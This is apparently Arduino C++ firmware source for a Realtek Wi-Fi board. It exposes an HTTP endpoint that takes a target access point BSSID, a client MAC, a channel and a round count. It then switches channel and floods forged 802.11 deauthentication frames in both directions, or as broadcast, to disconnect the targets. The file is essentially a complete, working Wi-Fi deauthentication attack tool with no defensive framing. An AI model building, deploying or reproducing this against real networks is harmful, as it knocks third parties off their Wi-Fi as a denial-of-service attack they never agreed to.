#include <Arduino.h>
#include <WiFi.h>
#include <main.h>
#include <wifi_conf.h>
#include <ArduinoJson.h>
#include "api_all.h"
#include "wifi_cust_tx.h"
#include "utils.h"
#include "wifi_drv.h"

// extern "C" void* alloc_mgtxmitframe(void* ptr);
// extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
// extern "C" int dump_mgntframe(void* ptr, void* frame_control);


static bool parseMac(const String& str, uint8_t* mac) {
    const char* s = str.c_str();
    for (int i = 0; i < 6; i++) {
        if (*s == 0) return false;
        unsigned int v = 0;
        for (int j = 0; j < 2; j++) {
            char c = *s++;
            if (c >= '0' && c <= '9') v = (v << 4) | (c - '0');
            else if (c >= 'a' && c <= 'f') v = (v << 4) | (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F') v = (v << 4) | (c - 'A' + 10);
            else return false;
        }
        mac[i] = (uint8_t)v;
        if (i < 5 && *s++ != ':') return false;
    }
    return true;
}

void handleDeauthApi(HttpClient& client, const String& req) {
    String bssidStr = urlDecode(extractQueryParam(req, "bssid"));
    String macStr   = urlDecode(extractQueryParam(req, "mac"));
    String chStr    = urlDecode(extractQueryParam(req, "channel"));
    String roundsStr = urlDecode(extractQueryParam(req, "rounds"));

    if (bssidStr.length() == 0 || macStr.length() == 0) {
        wifiClientSendJsonFail(client, "missing bssid or mac");
        return;
    }

    uint8_t bssid[6], mac[6];
    if (!parseMac(bssidStr, bssid) || !parseMac(macStr, mac)) {
        wifiClientSendJsonFail(client, "invalid mac address");
        return;
    }

    int channel = chStr.toInt();
    if (channel < 1 || channel > 165) channel = ap_channel;

    int rounds = roundsStr.toInt();
    if (rounds < 1) rounds = 5;

    Serial.print("[DEAUTH] target bssid="); Serial.print(bssidStr);
    Serial.print(" mac="); Serial.print(macStr);
    Serial.print(" channel="); Serial.print(channel);
    Serial.print(" rounds="); Serial.println(rounds);

    if (channel != ap_channel) {
        if (wifi_ap_switch_chl_and_inform(channel) != RTW_SUCCESS) {
            wifiClientSendJsonFail(client, "failed to switch channel");
            return;
        }
        wext_set_channel(WLAN0_NAME, channel);  // 必须，上面的调用不够
        ap_channel = channel;
        delay(100);
    }

    bool is_multicast = (mac[0] & 0x01);
    for (int r = 0; r < rounds; r++) {
        for (int p = 0; p < 10; p++) {
            // AP -> Client
            wifi_tx_deauth_frame_ext(bssid, mac, bssid, 0x06);
            delayMicroseconds(100);
            if (!is_multicast) {
                // Client -> AP
                wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x06);
                delayMicroseconds(100);
            } else {
                // AP -> Client (duplicate to maintain packet count if destination is broadcast/multicast)
                wifi_tx_deauth_frame_ext(bssid, mac, bssid, 0x06);
                delayMicroseconds(100);
            }
        }
        if (r < rounds - 1) {
            delay(100);
        }
    }

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "deauth sent";
    doc["rounds"] = rounds;
    doc["packets"] = rounds * 20;
    wifiClientSendJson(client, doc);

    Serial.println("[DEAUTH] done");
}
